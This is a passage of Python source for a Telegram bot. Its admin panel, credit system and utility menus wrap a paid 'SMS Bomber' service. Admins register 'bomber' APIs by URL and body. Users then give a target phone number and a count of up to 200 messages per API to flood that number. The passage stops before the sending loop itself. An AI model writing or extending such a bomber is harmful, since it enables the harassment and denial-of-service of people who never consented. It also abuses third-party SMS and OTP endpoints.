            elif cmd == 'MAKE' and len(parts) >= 3 and parts[1].upper() == 'PREMIUM':
                target_id = int(parts[2])
                expiry = (datetime.now() + timedelta(days=30)).isoformat()
                await conn.execute("UPDATE users SET is_premium = 1, premium_expiry = ? WHERE user_id = ?", (expiry, target_id))
                await conn.commit()
                await update.message.reply_text(f"👑 User `{target_id}` is now Premium! (30 days)", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            
            elif cmd == 'REMOVE' and len(parts) >= 3 and parts[1].upper() == 'PREMIUM':
                target_id = int(parts[2])
                await conn.execute("UPDATE users SET is_premium = 0, premium_expiry = NULL WHERE user_id = ?", (target_id,))
                await conn.commit()
                await update.message.reply_text(f"❌ Removed premium from user `{target_id}`!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            
            elif cmd == 'DELETE' and len(parts) >= 2:
                target_id = int(parts[1])
                await conn.execute("DELETE FROM users WHERE user_id = ?", (target_id,))
                await conn.commit()
                await update.message.reply_text(f"🗑️ User `{target_id}` deleted!", parse_mode="Markdown", reply_markup=get_admin_main_menu())
            else:
                await update.message.reply_text("❌ **Invalid command!**\n\n✅ `BLOCK USER_ID`\n✅ `UNBLOCK USER_ID`\n✅ `INFO USER_ID`\n✅ `LIST USERS`\n✅ `MAKE PREMIUM USER_ID`\n✅ `REMOVE PREMIUM USER_ID`\n✅ `DELETE USER_ID`", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'recharge_api':
        try:
            parts = message.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Invalid format! Use: `API_NAME AMOUNT`", parse_mode="Markdown")
                return
            
            api_name = parts[0]
            amount = int(parts[1])
            
            conn = await get_db()
            await conn.execute(
                """INSERT INTO api_inventory (api_name, total_credits, used_credits, remaining_credits, status)
                   VALUES (?, ?, 0, ?, 'active')
                   ON CONFLICT(api_name) DO UPDATE SET 
                   total_credits = total_credits + ?,
                   remaining_credits = remaining_credits + ?,
                   last_updated = CURRENT_TIMESTAMP""",
                (api_name, amount, amount, amount, amount)
            )
            await conn.commit()
            await admin_log(user_id, "Recharged API", None, f"{api_name}: +{amount} credits")
            
            await update.message.reply_text(f"✅ **Recharge Successful!**\n\n📡 API: `{api_name}`\n💰 Amount: `+{amount}`", parse_mode="Markdown", reply_markup=get_api_inventory_menu())
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'set_sms_key':
        try:
            key = message.strip()
            if len(key) < 5:
                await update.message.reply_text("❌ API Key too short!", reply_markup=get_settings_menu())
                return
            
            await update_setting("sms_api_key", key)
            await load_sms_api()
            await update.message.reply_text(f"✅ SMS API Key set!", parse_mode="Markdown", reply_markup=get_settings_menu())
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'set_sms_url':
        try:
            url = message.strip()
            if not url.startswith('http'):
                await update.message.reply_text("❌ Invalid URL! Start with `http://` or `https://`", reply_markup=get_settings_menu())
                return
            
            await update_setting("sms_api_url", url)
            await load_sms_api()
            await update.message.reply_text(f"✅ SMS API URL set!", parse_mode="Markdown", reply_markup=get_settings_menu())
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return

    if state == 'set_welcome':
        try:
            msg = message.strip()
            if not msg:
                await update.message.reply_text("❌ Message cannot be empty!", reply_markup=get_settings_menu())
                return
            await update_setting("welcome_message", msg)
            await update.message.reply_text(f"✅ **Welcome message updated!**\n\nNew message:\n{msg}", parse_mode="Markdown", reply_markup=get_settings_menu())
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return

    if state == 'set_group':
        try:
            group_id = message.strip()
            if not group_id or group_id.lower() == 'no':
                await update_setting("required_group", "")
                await update.message.reply_text("✅ Group check disabled!", reply_markup=get_settings_menu())
            else:
                # Validate: group ID must be a number (negative)
                try:
                    int(group_id)
                except ValueError:
                    await update.message.reply_text("❌ Invalid group ID! It must be a number (e.g., -1001234567890)", reply_markup=get_settings_menu())
                    return
                await update_setting("required_group", group_id)
                await update.message.reply_text(f"✅ **Required group set**\n\nGroup ID: `{group_id}`", parse_mode="Markdown", reply_markup=get_settings_menu())
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return

# ===================== API MANAGER STATE HANDLER =====================
async def api_manager_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message.text
    state = context.user_data.get('admin_state')
    
    if state == 'add_api':
        try:
            parts = message.split('|')
            if len(parts) != 5:
                await update.message.reply_text("❌ Invalid format! Use: `NAME|METHOD|URL|BODY|TYPE`", parse_mode="Markdown")
                return
            
            name = parts[0].strip()
            method = parts[1].strip().upper()
            url = parts[2].strip()
            body = parts[3].strip()
            api_type = parts[4].strip().lower()
            
            if api_type not in ['bomber', 'send']:
                await update.message.reply_text("❌ TYPE must be `bomber` or `send`!", parse_mode="Markdown")
                return
            
            json.loads(body)
            
            conn = await get_db()
            cursor = await conn.execute("SELECT 1 FROM apis WHERE name = ?", (name,))
            if await cursor.fetchone():
                await update.message.reply_text(f"❌ API `{name}` already exists!", parse_mode="Markdown")
                return
            
            await conn.execute(
                "INSERT INTO apis (name, method, url, body, api_type, added_by) VALUES (?, ?, ?, ?, ?, ?)",
                (name, method, url, body, api_type, user_id)
            )
            await conn.commit()
            await admin_log(user_id, "Added API", None, f"{name} ({api_type})")
            await load_apis()
            
            await update.message.reply_text(f"✅ API `{name}` added! ({api_type})", parse_mode="Markdown", reply_markup=get_api_manager_menu())
        except json.JSONDecodeError:
            await update.message.reply_text("❌ Invalid JSON BODY! Provide valid JSON.", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'edit_api_id':
        try:
            api_id = int(message.strip())
            context.user_data['edit_api_id'] = api_id
            context.user_data['admin_state'] = 'edit_api_data'
            await update.message.reply_text("Now send the new data: `NAME|METHOD|URL|BODY|TYPE`", parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("❌ Invalid ID! Enter a number.")
        return
    
    if state == 'edit_api_data':
        try:
            api_id = context.user_data.get('edit_api_id')
            parts = message.split('|')
            if len(parts) != 5:
                await update.message.reply_text("❌ Invalid format! Use: `NAME|METHOD|URL|BODY|TYPE`", parse_mode="Markdown")
                return
            
            name = parts[0].strip()
            method = parts[1].strip().upper()
            url = parts[2].strip()
            body = parts[3].strip()
            api_type = parts[4].strip().lower()
            
            if api_type not in ['bomber', 'send']:
                await update.message.reply_text("❌ TYPE must be `bomber` or `send`!", parse_mode="Markdown")
                return
            
            json.loads(body)
            
            conn = await get_db()
            cursor = await conn.execute("SELECT 1 FROM apis WHERE name = ? AND id != ?", (name, api_id))
            if await cursor.fetchone():
                await update.message.reply_text(f"❌ Another API named `{name}` exists!", parse_mode="Markdown")
                return
            
            await conn.execute(
                "UPDATE apis SET name = ?, method = ?, url = ?, body = ?, api_type = ? WHERE id = ?",
                (name, method, url, body, api_type, api_id)
            )
            await conn.commit()
            await admin_log(user_id, "Edited API", None, f"{name}")
            await load_apis()
            
            await update.message.reply_text(f"✅ API ID `{api_id}` updated!", parse_mode="Markdown", reply_markup=get_api_manager_menu())
        except json.JSONDecodeError:
            await update.message.reply_text("❌ Invalid JSON BODY!", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        context.user_data.pop('edit_api_id', None)
        return
    
    if state == 'delete_api':
        try:
            api_id = int(message.strip())
            conn = await get_db()
            cursor = await conn.execute("SELECT name FROM apis WHERE id = ?", (api_id,))
            row = await cursor.fetchone()
            if row:
                await conn.execute("DELETE FROM apis WHERE id = ?", (api_id,))
                await conn.commit()
                await admin_log(user_id, "Deleted API", None, row[0])
                await load_apis()
                await update.message.reply_text(f"🗑️ API ID `{api_id}` deleted!", parse_mode="Markdown", reply_markup=get_api_manager_menu())
            else:
                await update.message.reply_text("❌ API not found!", reply_markup=get_api_manager_menu())
        except ValueError:
            await update.message.reply_text("❌ Invalid ID! Enter a number.")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return
    
    if state == 'toggle_api':
        try:
            api_id = int(message.strip())
            conn = await get_db()
            cursor = await conn.execute("SELECT is_active, name, url, body, method FROM apis WHERE id = ?", (api_id,))
            row = await cursor.fetchone()
            if row:
                new_status = 1 if row[0] == 0 else 0
                await conn.execute("UPDATE apis SET is_active = ? WHERE id = ?", (new_status, api_id))
                await conn.commit()
                await admin_log(user_id, "Toggled API", None, f"{row[1]} → {'Active' if new_status else 'Inactive'}")
                await load_apis()
                await update.message.reply_text(f"🔄 API toggled!", parse_mode="Markdown", reply_markup=get_api_manager_menu())
            else:
                await update.message.reply_text("❌ API not found!", reply_markup=get_api_manager_menu())
        except ValueError:
            await update.message.reply_text("❌ Invalid ID! Enter a number.")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        context.user_data['admin_state'] = None
        return

# ===================== USER UTILITY HANDLERS =====================
async def handle_utilities(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text
    
    # Clean message (remove color emoji)
    clean_message = message
    for emoji in ["🟦", "🟩", "🟪", "🟧", "🟨", "🟥", "🩷", "⬜"]:
        clean_message = clean_message.replace(emoji, "").strip()
    
    if clean_message == "🌐 IP Info":
        result = await get_ip_info()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "💰 Bitcoin Price":
        result = await get_bitcoin_price()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "🥇 Gold Price":
        result = await get_gold_price()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "🦠 COVID-19":
        result = await get_covid_data()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "💱 Currency Converter":
        await update.message.reply_text(
            "💱 **Currency Converter**\n\nFormat: `FROM TO AMOUNT`\nExample: `USD BDT 100`",
            parse_mode="Markdown"
        )
        context.user_data['state'] = 'currency_convert'
        return
    
    if clean_message == "📡 Service Status":
        await update.message.reply_text(
            "📡 **Service Status**\n\nWhich service status do you want?\nExample: `github`, `stripe`, `aws`, `google`, `facebook`, `twitter`, `discord`, `telegram`",
            parse_mode="Markdown"
        )
        context.user_data['state'] = 'service_status'
        return
    
    if clean_message == "🌤️ Weather":
        await update.message.reply_text("🌤️ **Weather**\n\nEnter city name:", parse_mode="Markdown")
        context.user_data['state'] = 'weather'
        return
    
    if clean_message == "🎬 Movie Info":
        await update.message.reply_text("🎬 **Movie Info**\n\nEnter movie name:", parse_mode="Markdown")
        context.user_data['state'] = 'movie_info'
        return
    
    if clean_message == "📮 ZIP Code":
        await update.message.reply_text("📮 **ZIP Code Info**\n\nFormat: `country_code ZIP_code`\nExample: `us 33162`", parse_mode="Markdown")
        context.user_data['state'] = 'zip_info'
        return
    
    if clean_message == "🏛️ Universities":
        await update.message.reply_text("🏛️ **University List**\n\nEnter country name:", parse_mode="Markdown")
        context.user_data['state'] = 'universities'
        return
    
    if clean_message == "📰 News":
        result = await get_news()
        await update.message.reply_text(result, parse_mode="Markdown")
        return

async def handle_fun(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text
    
    # Clean message
    clean_message = message
    for emoji in ["🟦", "🟩", "🟪", "🟧", "🟨", "🟥", "🩷", "⬜"]:
        clean_message = clean_message.replace(emoji, "").strip()
    
    if clean_message == "😂 Random Joke":
        result = await get_random_joke()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "🐕 Random Dog":
        result = await get_random_dog()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "🎯 Random Activity":
        result = await get_random_activity()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "👤 Random User":
        result = await get_random_user()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "💬 Random Quote":
        result = await get_random_quote()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "🎂 Age Predictor":
        await update.message.reply_text("🎂 **Age Prediction**\n\nEnter your name:", parse_mode="Markdown")
        context.user_data['state'] = 'age_predict'
        return
    
    if clean_message == "🧑‍🤝‍🧑 Gender Predictor":
        await update.message.reply_text("🧑‍🤝‍🧑 **Gender Prediction**\n\nEnter your name:", parse_mode="Markdown")
        context.user_data['state'] = 'gender_predict'
        return
    
    if clean_message == "🌍 Nationality Predictor":
        await update.message.reply_text("🌍 **Nationality Prediction**\n\nEnter your name:", parse_mode="Markdown")
        context.user_data['state'] = 'nationality_predict'
        return

async def handle_sports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text
    
    # Clean message
    clean_message = message
    for emoji in ["🟦", "🟩", "🟪", "🟧", "🟨", "🟥", "🩷", "⬜"]:
        clean_message = clean_message.replace(emoji, "").strip()
    
    if clean_message == "⚽ Football Predictions":
        result = await get_football_predictions()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "🏏 Cricket":
        await update.message.reply_text("🏏 **Cricket Info**\n\nComing soon...", parse_mode="Markdown")
        return
    
    if clean_message == "🏀 Basketball":
        await update.message.reply_text("🏀 **Basketball Info**\n\nComing soon...", parse_mode="Markdown")
        return
    
    if clean_message == "🎾 Tennis":
        await update.message.reply_text("🎾 **Tennis Info**\n\nComing soon...", parse_mode="Markdown")
        return

async def handle_finance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text
    
    # Clean message
    clean_message = message
    for emoji in ["🟦", "🟩", "🟪", "🟧", "🟨", "🟥", "🩷", "⬜"]:
        clean_message = clean_message.replace(emoji, "").strip()
    
    if clean_message == "💰 Bitcoin Price":
        result = await get_bitcoin_price()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "🥇 Gold Price":
        result = await get_gold_price()
        await update.message.reply_text(result, parse_mode="Markdown")
        return
    
    if clean_message == "💱 Currency Converter":
        await update.message.reply_text(
            "💱 **Currency Converter**\n\nFormat: `FROM TO AMOUNT`\nExample: `USD BDT 100`",
            parse_mode="Markdown"
        )
        context.user_data['state'] = 'currency_convert'
        return
    
    if clean_message == "📈 Stock Market":
        await update.message.reply_text("📈 **Stock Market**\n\nComing soon...", parse_mode="Markdown")
        return
    
    if clean_message == "🏦 Bank Rates":
        await update.message.reply_text("🏦 **Bank Rates**\n\nComing soon...", parse_mode="Markdown")
        return
    
    if clean_message == "💳 Crypto Prices":
        await update.message.reply_text("💳 **Crypto Prices**\n\nComing soon...", parse_mode="Markdown")
        return

# ===================== UTILITY STATE HANDLER =====================
async def handle_utility_state(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state')
    message = update.message.text
    
    if state == 'currency_convert':
        parts = message.split()
        if len(parts) != 3:
            await update.message.reply_text("❌ Invalid format! Use: `FROM TO AMOUNT`\nExample: `USD BDT 100`", parse_mode="Markdown")
            return
        
        from_currency, to_currency, amount_str = parts
        try:
            amount = float(amount_str)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount! Enter a number.", parse_mode="Markdown")
            return
        
        result = await convert_currency(from_currency, to_currency, amount)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    if state == 'service_status':
        result = await check_service_status(message)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    if state == 'weather':
        result = await get_weather(message)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    if state == 'movie_info':
        result = await get_movie_info(message)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    if state == 'zip_info':
        parts = message.split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format! Use: `country_code ZIP_code`\nExample: `us 33162`", parse_mode="Markdown")
            return
        
        country, zip_code = parts
        result = await get_zip_info(country, zip_code)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    if state == 'universities':
        result = await get_universities(message)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    if state == 'age_predict':
        result = await get_age_by_name(message)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    if state == 'gender_predict':
        result = await get_gender_by_name(message)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    if state == 'nationality_predict':
        result = await get_nationality_by_name(message)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return

# ===================== START =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    if get_setting('maintenance_mode', 'false') == 'true' and user_id != ADMIN_ID:
        await update.message.reply_text("🔧 Bot is under maintenance!", parse_mode="Markdown")
        return

    # Group membership check (only for regular users)
    if user_id != ADMIN_ID:
        in_group = await check_group_membership(user_id, context)
        if not in_group:
            await send_group_required_message(update, context)
            return

    conn = await get_db()
    
    await conn.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, user.username or user.first_name))
    await conn.execute("UPDATE users SET referral_code = ? WHERE user_id = ? AND referral_code IS NULL", (generate_referral_code(user_id), user_id))
    
    cursor = await conn.execute("SELECT welcome_bonus_claimed, balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    welcome_message = ""
    
    if row and row[0] == 0:
        welcome_bonus = int(get_setting('welcome_bonus_amount', '10'))
        await conn.execute(
            "UPDATE users SET balance = balance + ?, welcome_bonus_claimed = 1 WHERE user_id = ?",
            (welcome_bonus, user_id)
        )
        await conn.commit()
        
        welcome_message = f"🎉 **Welcome!**\n\n✅ You received `{welcome_bonus}` credits welcome bonus!\n💰 Your balance: {welcome_bonus} credits"
    
    await conn.commit()

    if user_id == ADMIN_ID:
        await update.message.reply_text(
            f"🛡️ **Admin Panel**\n\nWelcome, {user.first_name}!\n\n🔹 You are in admin mode\n🔹 Use '🔙 Exit Admin' to switch to user mode",
            parse_mode="Markdown",
            reply_markup=get_admin_main_menu()
        )
        return

    cursor = await conn.execute("SELECT balance, is_premium, premium_expiry FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if row and row[1] == 1 and is_premium_expired(row[2]):
        await conn.execute("UPDATE users SET is_premium = 0, premium_expiry = NULL WHERE user_id = ?", (user_id,))
        await conn.commit()
        row = (row[0], 0, None)
    
    response = f"🔥 **Welcome {user.first_name}!**\n\n"
    response += f"💰 Balance: {row[0] if row else 0} credits\n"
    response += f"📡 Bomber APIs: {len(BOMBER_APIS)}\n\n"
    response += f"📌 **Select an option:**"
    
    # ===== PRIVATE LOG: User joined / started bot =====
    try:
        bal = row[0] if row else 0
        await log_user_action(
            context,
            user,
            "JOINED / STARTED BOT",
            f"Balance: {bal}\nPremium: {'Yes' if (row and row[1]==1) else 'No'}"
        )
    except Exception as e:
        logger.error(f"Join log error: {e}")

    # ===== WELCOME MEDIA (photo / video / gif) =====
    try:
        is_prem = bool(row and row[1] == 1 and not is_premium_expired(row[2] if len(row) > 2 else None))
        media_caption = get_setting("welcome_message", "🔥 Welcome!")
        sent = await send_welcome_media(update, context, caption_text=media_caption, is_premium=is_prem)
        if not sent and welcome_message:
            await update.message.reply_text(welcome_message, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Welcome media send error: {e}")
        if welcome_message:
            await update.message.reply_text(welcome_message, parse_mode="Markdown")
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_main_keyboard())

# ===================== DAILY BONUS =====================
async def daily_bonus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if get_setting('daily_bonus_enabled', 'false') != 'true':
        await update.message.reply_text("❌ Daily bonus is disabled!", reply_markup=get_main_keyboard())
        return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT is_premium, premium_expiry FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    is_prem = row and row[0] == 1 and not is_premium_expired(row[1])
    if row and row[0] == 1 and is_premium_expired(row[1]):
        await conn.execute("UPDATE users SET is_premium = 0, premium_expiry = NULL WHERE user_id = ?", (user_id,))
        is_prem = False
    
    bonus = int(get_setting('premium_bonus' if is_prem else 'daily_bonus_amount', '10' if is_prem else '5'))
    cooldown = int(get_setting('daily_bonus_cooldown', '24'))
    
    cursor = await conn.execute("SELECT daily_bonus_date FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if row and row[0]:
        try:
            last_date = datetime.fromisoformat(row[0])
            if (datetime.now() - last_date).total_seconds() < (cooldown * 3600):
                remaining = (cooldown * 3600) - (datetime.now() - last_date).total_seconds()
                hours = int(remaining // 3600)
                minutes = int((remaining % 3600) // 60)
                await update.message.reply_text(f"⏳ Wait! {hours}h {minutes}m remaining", reply_markup=get_main_keyboard())
                return
        except:
            pass
    
    await conn.execute("UPDATE users SET balance = balance + ?, daily_bonus_date = ? WHERE user_id = ?", (bonus, datetime.now().isoformat(), user_id))
    await conn.commit()

    # ===== PRIVATE LOG: Daily bonus claimed =====
    try:
        user = update.effective_user
        await log_user_action(
            context,
            user,
            "⭐ DAILY BONUS CLAIMED",
            f"Bonus: +{bonus} credits\n"
            f"Premium bonus: {'Yes' if is_prem else 'No'}"
        )
    except Exception as e:
        logger.error(f"Daily bonus log error: {e}")
    
    await update.message.reply_text(f"🎉 Bonus claimed!\n✅ +{bonus} credits", parse_mode="Markdown", reply_markup=get_main_keyboard())

# ===================== PROFILE =====================
async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    conn = await get_db()
    cursor = await conn.execute("SELECT username, balance, total_sms, total_bombing, total_bulk, join_date, is_premium, premium_expiry, total_referrals FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if not row:
        await update.message.reply_text("❌ User not found!", reply_markup=get_main_keyboard())
        return
    
    is_prem = row[6] == 1 and not is_premium_expired(row[7])
    if row[6] == 1 and is_premium_expired(row[7]):
        await conn.execute("UPDATE users SET is_premium = 0, premium_expiry = NULL WHERE user_id = ?", (user_id,))
        is_prem = False
    
    cursor2 = await conn.execute("SELECT achievement_name FROM achievements WHERE user_id = ?", (user_id,))
    achievements = await cursor2.fetchall()
    
    response = f"👤 **Profile**\n\n"
    response += f"💰 Balance: {row[1]}\n"
    response += f"📨 SMS: {row[2]}\n"
    response += f"💣 Bomber: {row[3]}\n"
    response += f"📤 Bulk: {row[4]}\n"
    response += f"👑 Premium: {'✅' if is_prem else '❌'}\n"
    response += f"🤝 Referrals: {row[8]}\n"
    response += f"📅 Joined: {row[5][:10] if row[5] else 'N/A'}\n\n"
    response += f"📌 Referral Code: `{generate_referral_code(user_id)}`"
    
    if achievements:
        response += "\n\n🏅 **Achievements:**\n"
        for ach in achievements:
            response += f"├─ {ach[0]}\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_main_keyboard())

# ===================== LEADERBOARD =====================
async def leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = await get_db()
    cursor = await conn.execute("SELECT user_id, username, balance FROM users ORDER BY balance DESC LIMIT 10")
    rows = await cursor.fetchall()
    
    if not rows:
        await update.message.reply_text("📊 No users yet!", reply_markup=get_main_keyboard())
        return
    
    response = "🏆 **Top 10 Users**\n━━━━━━━━━━━━━━━━━━━\n\n"
    medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    for i, row in enumerate(rows):
        response += f"{medals[i]} `{row[0]}` - {row[1] or 'N/A'} - 💰{row[2]}\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_main_keyboard())

# ===================== SEND SMS =====================
async def cmd_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global SMS_API_URL, SMS_API_KEY
    user_id = update.effective_user.id
    
    if not SMS_API_URL or not SMS_API_KEY:
        await update.message.reply_text("❌ SMS API not configured! Contact admin.", reply_markup=get_main_keyboard())
        return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if not row or row[0] < 1:
        await update.message.reply_text("❌ Insufficient credits!", reply_markup=get_main_keyboard())
        return
    
    await update.message.reply_text("📨 **Send SMS**\n\nEnter phone number:\nExample: `018XXXXXXXX`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['state'] = 'sms_number'

async def sms_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    valid, msg = validate_phone(number)
    if not valid:
        await update.message.reply_text(f"❌ {msg}\nTry again:", reply_markup=get_back_keyboard())
        return
    
    context.user_data['sms_number'] = number
    context.user_data['state'] = 'sms_message'
    await update.message.reply_text(f"✅ Number: `{number}` ({detect_operator(number)})\n\n💬 **Enter message:**", parse_mode="Markdown", reply_markup=get_back_keyboard())

async def sms_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = context.user_data.get('sms_number')
    msg_text = update.message.text
    
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    conn = await get_db()
    cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if not row or row[0] < 1:
        await update.message.reply_text("❌ Insufficient credits!", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    await update.message.reply_text(f"⏳ Sending to `{number}`...", parse_mode="Markdown")
    
    success, response = await send_sms_api(number, msg_text)
    
    if success:
        await conn.execute("UPDATE users SET balance = balance - 1, total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
        await conn.commit()
        await track_api("Custom_SMS", True, user_id)
        await check_achievements(user_id)
        await update.message.reply_text(
            f"✅ **SMS Successful!**\n\n📱 `{number}`\n💰 Balance: {row[0] - 1} credits",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    else:
        await track_api("Custom_SMS", False, user_id)
        await update.message.reply_text(
            f"❌ **SMS Failed!**\n\n📱 `{number}`\n⚠️ {response}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    
    context.user_data.clear()

# ===================== SMS BOMBER =====================
async def cmd_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOMBING_ACTIVE
    
    if not BOMBING_ACTIVE:
        await update.message.reply_text(
            "⛔ **Bombing is currently disabled!**\n\n"
            "📌 Admin has stopped bombing.\n"
            "⏳ Try again later.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    if not BOMBER_APIS:
        await update.message.reply_text("❌ No bomber APIs configured!", reply_markup=get_main_keyboard())
        return
    
    total_apis = len(BOMBER_APIS)
    max_sms = total_apis * int(get_setting('max_bomber_amount', '200'))
    
    await update.message.reply_text(
        f"💣 **SMS Bomber**\n\n"
        f"📡 Total APIs: {total_apis}\n"
        f"📌 Max SMS: {max_sms}\n"
        f"📊 Status: {'🟢 Active' if BOMBING_ACTIVE else '🔴 Inactive'}\n\n"
        f"Enter target number:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'bomber_number'

async def bomber_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    valid, msg = validate_phone(number)
    if not valid:
        await update.message.reply_text(f"❌ {msg}\nTry again:", reply_markup=get_back_keyboard())
        return
    
    context.user_data['bomber_number'] = number
    context.user_data['state'] = 'bomber_amount'
    
    max_amount = int(get_setting('max_bomber_amount', '200'))
    await update.message.reply_text(
        f"✅ `{number}` ({detect_operator(number)})\n\n"
        f"💥 **Enter amount (1-{max_amount}):**",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOMBING_ACTIVE, BOMBING_TASKS
    
    if not BOMBING_ACTIVE:
        await update.message.reply_text(
            "⛔ **Bombing is disabled!**\n\n"
            "📌 Admin has stopped bombing.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        context.user_data.clear()
        return
    
    user_id = update.effective_user.id
    number = context.user_data.get('bomber_number')
    
    try:
        amount = int(update.message.text.strip())
        max_amount = int(get_setting('max_bomber_amount', '200'))
        if amount < 1 or amount > max_amount:
            await update.message.reply_text(f"❌ Enter between 1-{max_amount}!", reply_markup=get_back_keyboard())
            return
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number!", reply_markup=get_back_keyboard())
        return
    
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    active_apis = []
    seen = set()
    for api in BOMBER_APIS:
        if api.get('active', True) and api['name'] not in seen:
            seen.add(api['name'])
            active_apis.append(api)
    
    total_apis = len(active_apis)
    total_sms = total_apis * amount
    
    conn = await get_db()
    cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if not row or row[0] < total_sms:
        await update.message.reply_text(
            f"❌ Insufficient credits!\n"
            f"Required: {total_sms}\n"
            f"Your balance: {row[0] if row else 0}",
            reply_markup=get_main_keyboard()
        )
        context.user_data.clear()
        return
    
    # ===== PRIVATE LOG: Bomber started =====
    try:
        user = update.effective_user
        await log_user_action(
            context,
            user,
